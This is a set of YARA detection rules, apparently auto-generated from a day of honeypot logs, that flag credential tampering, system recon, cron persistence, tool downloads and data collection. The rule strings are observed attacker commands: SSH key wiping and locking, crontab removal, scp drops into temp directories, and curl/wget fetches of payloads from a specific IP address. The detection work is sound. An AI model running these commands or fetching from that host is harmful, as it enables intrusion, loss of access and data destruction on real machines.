// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260522_0653
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_CredentialTheft {
    meta:
        description = "LLM Honeypot Intelligence - CredentialTheft pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-05-22"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "169"
        unique_patterns = "5"
    strings:
        $s0 = "rm -rf .ssh" ascii nocase
        $s1 = "mkdir .ssh" ascii nocase
        $s2 = "chattr -ia .ssh" ascii nocase
        $s3 = "chmod -R go= ~/.ssh" ascii nocase
        $s4 = "lockr -ia .ssh" ascii nocase
    condition:
        any of them
}

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-05-22"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "924"
        unique_patterns = "12"
    strings:
        $s0 = "kill -9 $pid 2>/dev/null" ascii nocase
        $s1 = "uname -s -m" ascii nocase
        $s2 = "uptime -p" ascii nocase
        $s3 = "uname" ascii nocase
        $s4 = "uname -a" ascii nocase
        $s5 = "uname -m" ascii nocase
        $s6 = "grep \"Attached GPUs" ascii nocase
        $s7 = "uname -r" ascii nocase
        $s8 = "uname -s -v -n -r -m" ascii nocase
        $s9 = "lscpu" ascii nocase
        $s10 = "/bin/./uname -s -v -n -r -m" ascii nocase
        $s11 = "nvidia-smi -q" ascii nocase
    condition:
        any of them
}

rule Honeypot_Persistence {
    meta:
        description = "LLM Honeypot Intelligence - Persistence pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-05-22"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "8"
        unique_patterns = "2"
    strings:
        $s0 = "crontab -r" ascii nocase
        $s1 = "crontab -l" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-05-22"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "49"
        unique_patterns = "12"
    strings:
        $s0 = "scp -qt \"/dev/shm/kDSAADoJ" ascii nocase
        $s1 = "scp -t /var/tmp/k4hpytt9p9vk4tst6uuygjcnjz" ascii nocase
        $s2 = "scp -t ~/k4hpytt9p9vk4tst6uuygjcnjz" ascii nocase
        $s3 = "curl -O http://180.129.130.18/amd" ascii nocase
        $s4 = "scp -qt \"/var/tmp/kDSAADoJ" ascii nocase
        $s5 = "scp -t /tmp/k4hpytt9p9vk4tst6uuygjcnjz" ascii nocase
        $s6 = "scp -qt \"/tmp/kDSAADoJ" ascii nocase
        $s7 = "scp -qt \"/tmp/NfUJZBuw" ascii nocase
        $s8 = "scp -qt \"/var/tmp/uYkJtZaN" ascii nocase
        $s9 = "scp -qt \"/tmp/fjLaBUQT" ascii nocase
        $s10 = "wget http://180.129.130.18/syss" ascii nocase
        $s11 = "scp -qt \"/var/tmp/fjLaBUQT" ascii nocase
    condition:
        any of them
}

rule Honeypot_DataCollection {
    meta:
        description = "LLM Honeypot Intelligence - DataCollection pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-05-22"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "1"
    strings:
        $s0 = "locate D877F783D5D3EF8Cs" ascii nocase
    condition:
        any of them
}